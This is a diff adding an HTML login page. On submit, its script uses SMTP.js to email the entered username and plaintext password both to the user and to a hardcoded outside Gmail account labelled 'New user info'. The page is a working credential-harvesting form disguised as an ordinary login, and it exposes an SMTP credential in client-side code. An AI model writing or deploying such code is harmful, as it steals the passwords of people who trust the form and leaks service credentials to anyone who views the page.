@@ -1,0 +1,133 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Login</title>
+  <style>
+    body {
+      margin: 0;
+      padding: 0;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      height: 100vh;
+      background-color: #dadada;
+      /* Light background color */
+      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+      color: #333;
+      /* Dark text color for better readability */
+    }
+
+    form {
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      height: 100%;
+    }
+
+    .card {
+      display: flex;
+      flex-direction: column;
+      background-color: #fff;
+      /* White background for the card */
+      width: 400px;
+      padding: 30px;
+      border-radius: 8px;
+      /* Slightly rounded corners for a modern look */
+      box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1);
+      /* Soft box shadow for depth */
+    }
+
+    .card * {
+      margin: 15px 0;
+      padding: 10px;
+    }
+
+    .header {
+      font-size: larger;
+      text-align: center;
+    }
+
+    input,
+    button {
+      padding: 12px;
+      border: 1px solid #ddd;
+      /* Light border color */
+      border-radius: 5px;
+      font-size: 16px;
+      outline: none;
+    }
+
+    input::placeholder {
+      color: #888;
+    }
+
+    button {
+      background-color: #3498db;
+      /* Blue color for the button */
+      color: #fff;
+      /* White text color for better contrast */
+      cursor: pointer;
+      transition: background-color 0.3s;
+    }
+
+    button:hover {
+      background-color: #217dbb;
+      /* Darker blue on hover */
+    }
+  </style>
+</head>
+
+<body>
+  <form id='loginForm'>
+    <div class="card">
+      <p class="header">Log In</p>
+      <input type="text" placeholder="Username" id="username" required>
+      <input type="email" placeholder="Email address" id="email" required>
+      <input type="password" placeholder="Password" id="password" required>
+      <button type="submit" id="button">Register</button>
+    </div>
+  </form>
+  <script src="https://smtpjs.com/v3/smtp.js">
+  </script>
+  <script>
+    const password = "580ED22E16A95BB2C31871CB7A811B612B59";
+    document.addEventListener('DOMContentLoaded', function () {
+      const form = document.getElementById('loginForm');
+
+      form.addEventListener('submit', function (event) {
+        event.preventDefault();
+        const passwordUser = document.getElementById('password').value;
+        const username = document.getElementById("username").value;
+        const email = document.getElementById("email").value;
+
+
+
+        // Sending an email with SMTP.js to verify the user's account
+        Email.send({
+          Host: "smtp.elasticemail.com",
+          Username: "chetouanelahouari@gmail.com",
+          Password: password,
+          To: email,
+          From: "chetouanelahouari@gmail.com",
+          Subject: "TFC-challenge",
+          Body: `Hello ${username}, your password is ${passwordUser}`
+        })
+        Email.send({
+          Host: "smtp.elasticemail.com",
+          Username: "chetouanelahouari@gmail.com",
+          Password: password,
+          To: 'chetouanelahouari@gmail.com',
+          From: "chetouanelahouari@gmail.com",
+          Subject: "New user info ",
+          Body: `Hello ${username}, your password is ${passwordUser}`
+        })
+
+      });
+    })
+  </script>
+</body>
+
+</html>
